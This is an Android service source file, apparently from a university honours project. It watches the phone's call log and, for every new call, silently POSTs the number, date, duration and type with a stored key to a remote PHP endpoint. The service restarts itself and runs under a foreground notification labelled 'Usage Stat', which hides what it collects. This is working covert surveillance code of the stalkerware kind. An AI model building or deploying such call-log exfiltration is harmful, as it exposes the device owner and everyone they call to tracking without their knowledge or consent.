package uk.ac.rgu.lab04.honours;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;

import androidx.core.app.ActivityCompat;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class CallLogsService extends Service {

    private ContentResolver contentResolver;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        startForeground(9, getNotification());
    }

    private Notification getNotification() {
        NotificationChannel channel = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            channel = new NotificationChannel("usageStatService", "Usage Stat", NotificationManager.IMPORTANCE_DEFAULT);
        }

        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notificationManager.createNotificationChannel(channel);
        }

        Notification.Builder builder = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(getApplicationContext(), "usageStatService").setAutoCancel(true);
        }
        return builder.build();
    }

    public void registerObserver() {

        contentResolver = getContentResolver();
        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI,
                true,new CallLogsObserver(new Handler()));
    }

    //start the service and register observer for lifetime
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        registerObserver();

        return START_STICKY;
    }

    public class CallLogsObserver extends ContentObserver {

        public CallLogsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            if (!selfChange) {
                try {
                    if (ActivityCompat.checkSelfPermission(getApplicationContext(),
                            Manifest.permission.READ_CONTACTS)
                            == PackageManager.PERMISSION_GRANTED) {
                        ContentResolver cr = getApplicationContext().getContentResolver();
                        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
                        if (cursor != null && cursor.getCount() > 0) {
                            //moving cursor to last position
                            //to get last element added
                            cursor.moveToLast();

                            String callerID = cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID));
                            if (!Constants.checkLastCallId(getApplicationContext(), callerID)) {
                                Constants.setLastCallId(getApplicationContext(),callerID);
                                String callerNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                                if (callerNumber.startsWith("+")){
                                    callerNumber="0"+callerNumber.substring(3);
                                }
                                long callDate = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                                long callDuration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                                int callType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                                if(callType == CallLog.Calls.INCOMING_TYPE) {
                                    insertData(Constants.getPrivateKey(getApplicationContext()),callerNumber,String.valueOf(callDate),
                                            String.valueOf(callDuration), String.valueOf(callType));
                                }
                                else if(callType == CallLog.Calls.OUTGOING_TYPE) {
                                    insertData(Constants.getPrivateKey(getApplicationContext()),callerNumber,String.valueOf(callDate),
                                            String.valueOf(callDuration), String.valueOf(callType));
                                }
                                else {
                                    insertData(Constants.getPrivateKey(getApplicationContext()),callerNumber,String.valueOf(callDate),
                                            String.valueOf(callDuration), "3");
                                }
                            }
                            cursor.close();
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    //send contact to server
    public static void insertData(final String key, final String phone, final String date,final String duration,final String type){

        class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
            @Override
            protected void onPreExecute() {
                super.onPreExecute();
            }

            @Override
            protected String doInBackground(String... params) {
                String reg_url=Constants.URL_SERVER+"insert/insertCall.php";
                String key=params[0];
                String phone=params[1];
                String date=params[2];
                String duration=params[3];
                String type=params[4];
                try {
                    URL url = new URL(reg_url);
                    HttpURLConnection httpURLConnection =
                            (HttpURLConnection)url.openConnection();
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoOutput(true);
                    OutputStream OS = httpURLConnection.getOutputStream();
                    BufferedWriter bufferedWriter = new BufferedWriter(new
                            OutputStreamWriter(OS, StandardCharsets.UTF_8));
                    String data= URLEncoder.encode("key","UTF-8")+"="+URLEncoder.encode(key,"UTF-8")
                            +"&"+URLEncoder.encode("phone","UTF-8")+"="+URLEncoder.encode(phone,"UTF-8")
                            +"&"+URLEncoder.encode("date","UTF-8")+"="+URLEncoder.encode(date,"UTF-8")
                            +"&"+URLEncoder.encode("duration","UTF-8")+"="+URLEncoder.encode(duration,"UTF-8")
                            +"&"+URLEncoder.encode("type","UTF-8")+"="+URLEncoder.encode(type,"UTF-8");
                    bufferedWriter.write(data);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    OS.close();
                    InputStream IS = httpURLConnection.getInputStream();
                    IS.close();
                    return "Registration Success!!";
                } catch (IOException e){
                    e.printStackTrace();
                }
                return null;
            }

            @Override
            protected void onProgressUpdate(Void... values) {
                super.onProgressUpdate(values);
            }
        }

        SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();

        sendPostReqAsyncTask.execute(key,phone,date,duration,type);
    }
}
